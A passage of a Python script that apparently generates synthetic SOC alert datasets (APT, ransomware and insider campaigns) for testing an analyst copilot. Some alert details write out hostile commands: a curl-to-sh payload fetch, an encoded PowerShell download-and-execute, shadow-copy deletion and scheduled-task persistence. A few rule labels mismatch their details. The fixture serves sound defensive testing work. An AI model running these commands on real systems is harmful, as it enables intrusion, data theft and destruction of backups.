            "sev":    sev,
            "rule":   rule,
            "src":    src,
            "dst":    dst,
            "detail": detail,
            "host":   host,
        })
        if len(result) >= count:
            break

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Campaign 1 — APT Intrusion (hardcoded, 23 alerts)
# ─────────────────────────────────────────────────────────────────────────────
CAMPAIGN_APT = [
    {"id":"ALT-0001","time":"09:12:33","sev":"LOW","rule":"Nmap Port Scan Detected","src":"185.220.101.45","dst":"203.0.113.10","detail":"SYN scan across 1024 ports in 4s — fingerprint matches Nmap 7.x","host":"LINUX-WEB-01"},
    {"id":"ALT-0002","time":"09:12:41","sev":"LOW","rule":"Service Enumeration — Banner Grab","src":"185.220.101.45","dst":"203.0.113.10","detail":"HTTP/SSH/FTP banner grabs on ports 22, 80, 443, 21","host":"LINUX-WEB-01"},
    {"id":"ALT-0003","time":"09:18:02","sev":"MEDIUM","rule":"SSH Brute Force — Low Rate","src":"185.220.101.45","dst":"203.0.113.10","detail":"8 failed SSH attempts in 120s for user 'admin'","host":"LINUX-WEB-01"},
    {"id":"ALT-0004","time":"09:19:44","sev":"MEDIUM","rule":"SSH Brute Force — Credential Stuffing","src":"185.220.101.45","dst":"203.0.113.10","detail":"47 failed SSH auth attempts — usernames from rockyou2024 breach list","host":"LINUX-WEB-01"},
    {"id":"ALT-0005","time":"09:23:17","sev":"HIGH","rule":"SSH Login After Brute Force","src":"185.220.101.45","dst":"203.0.113.10","detail":"Auth success for 'deploy' after 53 failures — password spray likely","host":"LINUX-WEB-01"},
    {"id":"ALT-0006","time":"09:24:05","sev":"HIGH","rule":"Suspicious Process Spawn via Shell","src":"203.0.113.10","dst":"185.220.101.45","detail":"bash → curl → sh pipeline; payload pulled from 185.220.101.45:8443","host":"LINUX-WEB-01"},
    {"id":"ALT-0007","time":"09:24:22","sev":"CRITICAL","rule":"Reverse Shell Established","src":"203.0.113.10","dst":"185.220.101.45","detail":"Outbound TCP/4444 — Metasploit meterpreter signature confirmed","host":"LINUX-WEB-01"},
    {"id":"ALT-0008","time":"09:25:11","sev":"MEDIUM","rule":"Internal Network Scan from Compromised Host","src":"10.0.1.15","dst":"10.0.1.0/24","detail":"ARP sweep + TCP SYN scan of 10.0.1.0/24 — 14 live hosts identified","host":"LINUX-WEB-01"},
    {"id":"ALT-0009","time":"09:25:44","sev":"MEDIUM","rule":"LDAP Enumeration — Active Directory","src":"10.0.1.15","dst":"10.0.1.5","detail":"Unauthenticated LDAP query: all users, groups, OUs dumped from DC01","host":"DC01"},
    {"id":"ALT-0010","time":"09:31:08","sev":"HIGH","rule":"Pass-the-Hash — NTLM Lateral Movement","src":"10.0.1.15","dst":"10.0.1.22","detail":"SMB auth via NTLM hash for 'svc_backup' — no plaintext credential","host":"FILESERVER-01"},
    {"id":"ALT-0011","time":"09:32:55","sev":"HIGH","rule":"RDP Login — Unusual Source","src":"10.0.1.15","dst":"10.0.1.30","detail":"RDP session from LINUX-WEB-01 (10.0.1.15) — atypical for Linux host","host":"DESKTOP-FIN-03"},
    {"id":"ALT-0012","time":"09:33:40","sev":"MEDIUM","rule":"Scheduled Task — Persistence Mechanism","src":"10.0.1.15","dst":"10.0.1.30","detail":"schtasks /create /tn 'WindowsUpdate' /tr 'C:\\Temp\\svchostt.exe' /sc onlogon","host":"DESKTOP-FIN-03"},
    {"id":"ALT-0013","time":"09:38:12","sev":"CRITICAL","rule":"Kerberoasting Attack Detected","src":"10.0.1.15","dst":"10.0.1.5","detail":"TGS requests for 6 SPNs in 2s — Rubeus/Impacket GetUserSPNs pattern","host":"DC01"},
    {"id":"ALT-0014","time":"09:41:03","sev":"CRITICAL","rule":"DCSync — Domain Replication Abuse","src":"10.0.1.15","dst":"10.0.1.5","detail":"MS-DRSR replication from non-DC host — mimikatz dcsync credential dump","host":"DC01"},
    {"id":"ALT-0015","time":"09:45:22","sev":"HIGH","rule":"Sensitive File Access — Bulk Read","src":"10.0.1.22","dst":"10.0.1.22","detail":"1,847 files read from \\\\FILESERVER-01\\Finance in 3 min — bulk enumeration","host":"FILESERVER-01"},
    {"id":"ALT-0016","time":"09:47:01","sev":"HIGH","rule":"Data Archive Creation — Staging","src":"10.0.1.30","dst":"10.0.1.30","detail":"7z.exe created data.7z (2.3 GB) — password-protected archive","host":"DESKTOP-FIN-03"},
    {"id":"ALT-0017","time":"09:52:14","sev":"CRITICAL","rule":"Large Outbound Transfer — Unusual Destination","src":"10.0.1.30","dst":"185.220.101.45","detail":"2.1 GB egress to 185.220.101.45:443 over 8 min — no approved cloud sync","host":"DESKTOP-FIN-03"},
    {"id":"ALT-0018","time":"09:53:02","sev":"CRITICAL","rule":"DNS Tunneling — C2 Communication","src":"10.0.1.15","dst":"8.8.8.8","detail":"High-entropy TXT queries to rnd8a2f.exfil-domain.ru — iodine/dnscat2 pattern","host":"LINUX-WEB-01"},
    {"id":"ALT-0019","time":"09:55:33","sev":"HIGH","rule":"HTTPS Egress — Non-Standard Port","src":"10.0.1.15","dst":"185.220.101.45","detail":"TLS 1.3 on TCP/8443 — JA3 fingerprint matches Cobalt Strike beacon","host":"LINUX-WEB-01"},
    {"id":"ALT-0020","time":"09:14:00","sev":"LOW","rule":"DNS Query — First-Seen Domain","src":"10.0.1.44","dst":"8.8.8.8","detail":"First-seen query for api.github.com — developer workstation, likely legitimate","host":"DESKTOP-ENG-01"},
    {"id":"ALT-0021","time":"09:27:30","sev":"LOW","rule":"Vulnerability Scanner — Scheduled Scan","src":"10.0.1.99","dst":"10.0.0.0/8","detail":"Nessus scan from approved SCANNER-01 — scheduled maintenance window","host":"SCANNER-01"},
    {"id":"ALT-0022","time":"09:30:00","sev":"LOW","rule":"Admin Share Access — Domain Routine","src":"10.0.1.5","dst":"10.0.1.22","detail":"DC01 accessed ADMIN$ on FILESERVER-01 — routine domain admin activity","host":"FILESERVER-01"},
    {"id":"ALT-0023","time":"09:50:11","sev":"LOW","rule":"Cloud Storage Sync — Approved Tool","src":"10.0.1.40","dst":"52.96.184.132","detail":"OneDrive sync uploading 340 MB to Microsoft 365 — normal business activity","host":"DESKTOP-HR-01"},
]

# ─────────────────────────────────────────────────────────────────────────────
# Campaign 2 — Ransomware (hardcoded, 14 alerts)
# ─────────────────────────────────────────────────────────────────────────────
CAMPAIGN_RANSOMWARE = [
    {"id":"ALT-0001","time":"08:03:22","sev":"MEDIUM","rule":"Phishing Email — Macro Attachment","src":"91.243.44.17","dst":"10.0.2.55","detail":"'Invoice_Q2.xlsm' macro attachment delivered — auto-exec on open","host":"MAIL-GW-01"},
    {"id":"ALT-0002","time":"08:11:04","sev":"HIGH","rule":"Office Macro — Suspicious Child Process","src":"10.0.2.55","dst":"10.0.2.55","detail":"EXCEL.EXE spawned cmd.exe → powershell -enc [base64] — macro execution","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0003","time":"08:11:19","sev":"HIGH","rule":"PowerShell — Encoded Command Execution","src":"10.0.2.55","dst":"91.243.44.17","detail":"powershell -enc decoded: IEX(New-Object Net.WebClient).DownloadString","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0004","time":"08:11:35","sev":"CRITICAL","rule":"Malware Dropper — Executable Written","src":"10.0.2.55","dst":"10.0.2.55","detail":"svchost32.exe (4.2 MB) written to C:\\Users\\jsmith\\AppData\\Local\\Temp","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0005","time":"08:12:01","sev":"HIGH","rule":"Ransomware Network Propagation","src":"10.0.2.55","dst":"10.0.2.0/24","detail":"SMB MS17-010 probe against all /24 hosts TCP/445 — worm-like spread","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0006","time":"08:13:44","sev":"CRITICAL","rule":"Shadow Copy Deletion — Anti-Recovery","src":"10.0.2.55","dst":"10.0.2.55","detail":"vssadmin delete shadows /all /quiet — ransomware pre-encryption step","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0007","time":"08:13:52","sev":"CRITICAL","rule":"Shadow Copy Deletion — Anti-Recovery","src":"10.0.2.31","dst":"10.0.2.31","detail":"vssadmin delete shadows /all /quiet — propagated to second host","host":"DESKTOP-ACCT-03"},
    {"id":"ALT-0008","time":"08:14:05","sev":"CRITICAL","rule":"Mass File Encryption — Ransomware","src":"10.0.2.55","dst":"10.0.2.55","detail":"3,200 files renamed to .locked extension in 90s — encryption in progress","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0009","time":"08:14:21","sev":"CRITICAL","rule":"Mass File Encryption — Ransomware","src":"10.0.2.31","dst":"10.0.2.31","detail":"2,800 files renamed to .locked — second workstation compromised","host":"DESKTOP-ACCT-03"},
    {"id":"ALT-0010","time":"08:14:33","sev":"CRITICAL","rule":"Sensitive File Access — Bulk Read","src":"10.0.2.55","dst":"10.0.2.10","detail":"11,400 files on \\\\FILESERVER-01 renamed to .locked — network share encrypted","host":"FILESERVER-01"},
    {"id":"ALT-0011","time":"08:15:02","sev":"HIGH","rule":"Ransom Note Dropped","src":"10.0.2.55","dst":"10.0.2.55","detail":"README_DECRYPT.txt written to Desktop, Documents, Downloads — LockBit 3.0","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0012","time":"08:15:18","sev":"HIGH","rule":"C2 Beacon — Periodic Callback","src":"10.0.2.55","dst":"91.243.44.17","detail":"HTTPS POST to /gate.php with encrypted payload — LockBit operator check-in","host":"DESKTOP-ACCT-02"},
    {"id":"ALT-0013","time":"08:05:10","sev":"LOW","rule":"Phishing Email — Macro Attachment","src":"10.0.2.60","dst":"10.0.2.60","detail":"Word .docx attachment opened — quarterly report from known vendor, benign","host":"DESKTOP-ACCT-01"},
    {"id":"ALT-0014","time":"08:09:00","sev":"LOW","rule":"PowerShell — Signed Management Script","src":"10.0.1.5","dst":"10.0.1.5","detail":"Signed PS DSC script by DC01 — Group Policy baseline check","host":"DC01"},
]

# ─────────────────────────────────────────────────────────────────────────────
# Campaign 3 — Insider Threat (hardcoded, 10 alerts)
# ─────────────────────────────────────────────────────────────────────────────
CAMPAIGN_INSIDER = [
    {"id":"ALT-0001","time":"22:14:08","sev":"LOW","rule":"VPN Login — Impossible Travel","src":"192.168.1.102","dst":"10.0.1.22","detail":"User 'm.johnson' authenticated at 22:14 — last login was 17:30 same day","host":"FILESERVER-01"},
    {"id":"ALT-0002","time":"22:15:30","sev":"MEDIUM","rule":"Sensitive File Access — Bulk Read","src":"192.168.1.102","dst":"10.0.3.5","detail":"m.johnson downloaded 847 files (4.1 GB) from SharePoint /sites/RnD in 12 min","host":"FILESERVER-01"},
    {"id":"ALT-0003","time":"22:18:44","sev":"MEDIUM","rule":"Sensitive File Access — Bulk Read","src":"192.168.1.102","dst":"10.0.3.8","detail":"Git clone of all 12 internal repos by m.johnson — full history included","host":"FILESERVER-02"},
    {"id":"ALT-0004","time":"22:27:11","sev":"HIGH","rule":"Cloud Upload — Unapproved Service","src":"192.168.1.102","dst":"31.13.72.36","detail":"3.8 GB uploaded to dropbox.com from m.johnson workstation — outside corp policy","host":"DESKTOP-ENG-01"},
    {"id":"ALT-0005","time":"22:29:02","sev":"HIGH","rule":"Large Outbound Transfer — Unusual Destination","src":"192.168.1.102","dst":"74.125.28.108","detail":"Gmail SMTP: 6 emails with attachments totalling 280 MB — personal account","host":"DESKTOP-ENG-01"},
    {"id":"ALT-0006","time":"22:31:55","sev":"MEDIUM","rule":"Data Archive Creation — Staging","src":"192.168.1.102","dst":"192.168.1.102","detail":"USB drive (SanDisk 64 GB) inserted; 2.1 GB written in 4 min — DLP alert","host":"DESKTOP-ENG-01"},
    {"id":"ALT-0007","time":"22:35:17","sev":"HIGH","rule":"DNS Query — First-Seen Domain","src":"192.168.1.102","dst":"8.8.8.8","detail":"DNS queries to careers.competitor-corp.com + recruiter LinkedIn — 14 requests","host":"DESKTOP-ENG-01"},
    {"id":"ALT-0008","time":"22:38:00","sev":"MEDIUM","rule":"Web App SQL Injection","src":"192.168.1.102","dst":"10.0.3.20","detail":"m.johnson attempted access to /admin/employees endpoint — 403 returned","host":"FILESERVER-01"},
    {"id":"ALT-0009","time":"22:12:00","sev":"LOW","rule":"Admin Share Access — Domain Routine","src":"192.168.1.80","dst":"10.0.1.5","detail":"On-call engineer r.patel authenticated — PagerDuty incident #14422 open","host":"DC01"},
    {"id":"ALT-0010","time":"22:20:00","sev":"LOW","rule":"Backup Job — Scheduled","src":"192.168.1.55","dst":"52.96.184.132","detail":"Veeam backup agent uploading nightly backup to Azure — scheduled job","host":"BACKUP-01"},
]

CAMPAIGNS = {
    "apt":        ("APT Intrusion (23 alerts)",   CAMPAIGN_APT),
    "ransomware": ("Ransomware Outbreak (14 alerts)", CAMPAIGN_RANSOMWARE),
    "insider":    ("Insider Threat (10 alerts)",  CAMPAIGN_INSIDER),
}


def post_alerts(alerts: list, url: str) -> None:
    payload = json.dumps(alerts).encode("utf-8")
    req = urllib.request.Request(url, data=payload,
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            print(f"[✓] POST {url} → {resp.status} {resp.reason}", file=sys.stderr)
            print(f"    Response: {resp.read(200).decode()}", file=sys.stderr)
    except urllib.error.HTTPError as e:
        print(f"[✗] HTTP {e.code}: {e.read(300).decode()}", file=sys.stderr)
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"[✗] Connection error: {e.reason}\n    Is the backend running at {url}?", file=sys.stderr)
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Generate synthetic SOC alert datasets for SOC Analyst Copilot",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--campaign", default="apt", choices=list(CAMPAIGNS.keys()),
                        help="Hardcoded campaign (default: apt)")
    parser.add_argument("--count", type=int, default=0,
                        help="Generate N alerts parametrically (overrides --campaign)")
    parser.add_argument("--seed", type=int, default=1337,
                        help="RNG seed for reproducible output (default: 1337)")
    parser.add_argument("--out", metavar="FILE",
                        help="Save JSON to file (default: stdout)")
    parser.add_argument("--post", action="store_true",
                        help="POST alerts to backend /api/analysis/run")
    parser.add_argument("--url", default="http://localhost:8000/api/analysis/run",
                        help="Backend URL (default: http://localhost:8000/api/analysis/run)")
    parser.add_argument("--list", action="store_true",
                        help="List hardcoded campaigns and exit")
    args = parser.parse_args()

    if args.list:
        print("\nHardcoded campaigns (--campaign):\n")
        for key, (name, alerts) in CAMPAIGNS.items():
            sc = {}
            for a in alerts:
                sc[a["sev"]] = sc.get(a["sev"], 0) + 1
            counts = "  ".join(f"{s}×{n}" for s, n in sorted(sc.items()))
            print(f"  {key:12s}  {name}")
            print(f"  {'':12s}  [{counts}]")
        print("\nParametric generation (--count N):\n")
        print("  Builds N alerts from a 53-template pool across 5 concurrent attack chains.")
        print("  Use --seed for reproducible output.\n")
        return

    if args.count > 0:
        print(f"[•] Generating {args.count} alerts (seed={args.seed})…", file=sys.stderr)
        alerts = generate_alerts(args.count, args.seed)
        sev_counts = {}
        for a in alerts:
            sev_counts[a["sev"]] = sev_counts.get(a["sev"], 0) + 1
        counts_str = "  ".join(f"{s}×{n}" for s, n in sorted(sev_counts.items()))
        print(f"[✓] {len(alerts)} alerts  [{counts_str}]", file=sys.stderr)
    else:
        _, alerts = CAMPAIGNS[args.campaign]

    output = json.dumps(alerts, indent=2)

    if args.out:
        with open(args.out, "w") as f:
            f.write(output)
        print(f"[✓] Saved {len(alerts)} alerts → {args.out}", file=sys.stderr)

    if args.post:
        print(f"[•] POSTing {len(alerts)} alerts to {args.url} …", file=sys.stderr)
        post_alerts(alerts, args.url)
        return

    if not args.out:
        print(output)


if __name__ == "__main__":
    main()
